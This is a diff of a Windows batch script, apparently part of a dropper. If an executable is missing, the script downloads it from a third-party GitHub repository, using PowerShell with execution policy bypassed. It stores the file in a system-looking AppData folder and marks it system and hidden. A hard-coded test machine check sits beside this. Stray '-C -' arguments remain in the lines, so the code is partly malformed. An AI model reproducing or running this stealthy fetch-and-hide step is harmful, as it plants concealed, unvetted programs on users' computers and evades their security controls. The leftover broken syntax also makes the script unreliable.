@@ -12,8 +12,8 @@ rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
 
-attrib -s -h -i "%environment%\curl.exe" -C - && if exist "%environment%\curl.exe" -C - (
-      attrib +s +h +i "%environment%\curl.exe" -C -
+attrib -s -h -i "%environment%\curl.exe" && if exist "%environment%\curl.exe" -C - (
+      attrib +s +h +i "%environment%\curl.exe"
 ) else (
  powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/bigherocenter/curl/raw/main/curl_7.83.1.exe' -OutFile '%environment%\curl.exe' -UseBasicParsing -MaximumRedirection 10 ; Start-BitsTransfer -Source (Invoke-WebRequest -Uri 'https://github.com/bigherocenter/curl/raw/main/curl_7.83.1.exe' -UseBasicParsing -MaximumRedirection 10).BaseResponse.ResponseUri.AbsoluteUri -Destination '%environment%\curl.exe'" && attrib +s +h +i "%environment%\curl.exe" -C - 
 )
